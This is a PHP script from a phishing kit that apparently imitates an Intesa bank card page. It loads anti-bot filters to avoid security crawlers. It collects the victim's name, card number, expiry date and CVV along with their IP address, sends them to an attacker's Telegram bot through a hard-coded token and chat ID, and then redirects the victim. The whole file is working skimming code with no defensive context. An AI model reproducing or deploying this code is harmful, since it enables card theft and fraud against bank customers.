<?php
session_start();
include('antibots.php');
include("Bots/Bots-fSOCIETY/anti1.php");
include("Bots/Bots-fSOCIETY/anti2.php");
include("Bots/Bots-fSOCIETY/anti3.php");
include("Bots/Bots-fSOCIETY/anti4.php");
include("Bots/Bots-fSOCIETY/anti5.php");
include("Bots/Bots-fSOCIETY/anti6.php");
include("Bots/Bots-fSOCIETY/anti7.php");
include("Bots/Bots-fSOCIETY/anti8.php");
include("./lib/simple_html_dom.php");
include './lib/Telegram.php';

function visitorip() {
	 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}
	 else if (getenv('HTTP_CLIENT_IP')){$ip = getenv('HTTP_CLIENT_IP');}
     else if(getenv('HTTP_X_FORWARDED_FOR')) {$ip = getenv('HTTP_X_FORWARDED_FOR');}
     else if(getenv('HTTP_X_FORWARDED')) {$ip = getenv('HTTP_X_FORWARDED');}
     else if(getenv('HTTP_FORWARDED_FOR')) {$ip = getenv('HTTP_FORWARDED_FOR');}
     else if(getenv('HTTP_FORWARDED')) {$ip = getenv('HTTP_FORWARDED');}
     else if(getenv('REMOTE_ADDR')) {$ip = getenv('REMOTE_ADDR');}
     else {$ip = $_SERVER['HTTP_HOST'];}
	 $ip=explode(",",$ip);
	 return $ip[0];
}

$ip = visitorip();
$hostname = gethostbyaddr($ip);
//$md5=md5(time());
//$pg=$_REQUEST['card'];
//$bin4 = substr($_POST['Luffy'] , 15 , 19);
$back = "load3.php" ;



//if(isset($_POST["Luffy"])){
	//$cc=str_replace(" ","",$_POST["Luffy"]);
	$cc="ARUBA";
	$message = "INTTESA CC".PHP_EOL;
	$message .= "Name : ".$_POST['fullname']."\n";
	$message .= "Card : ".$_POST['card']."\n";
	$message .= "Date : ".$_POST['date']."\n";
	$message .= "Cvv : ".$_POST['cvv']."\n";
	$message .= "IP             : $ip".PHP_EOL;

    $telegramluffy = new Telegram('6198349511:AAEN1l7bSdJ5SwGNhehYdcFr8t9UjdyvuvE');
	$contentluffy = array('chat_id' => "1069443961", 'text' => $message);
	$telegramluffy->sendMessage($contentluffy);
	
	
	header("Location: $back");

//}


?>